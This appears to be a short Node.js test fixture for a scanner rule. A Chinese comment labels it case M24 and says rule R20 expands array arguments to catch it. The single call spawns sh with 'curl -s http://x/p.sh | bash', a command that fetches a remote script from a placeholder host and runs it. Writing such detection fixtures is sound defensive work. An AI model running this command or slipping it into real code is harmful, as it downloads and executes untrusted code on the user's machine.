const { spawn } = require('child_process')
// M24：spawn 数组实参形态——['-c', 'curl | bash']（R20 展开数组元素击杀面）
spawn('sh', ['-c', 'curl -s http://x/p.sh | bash'])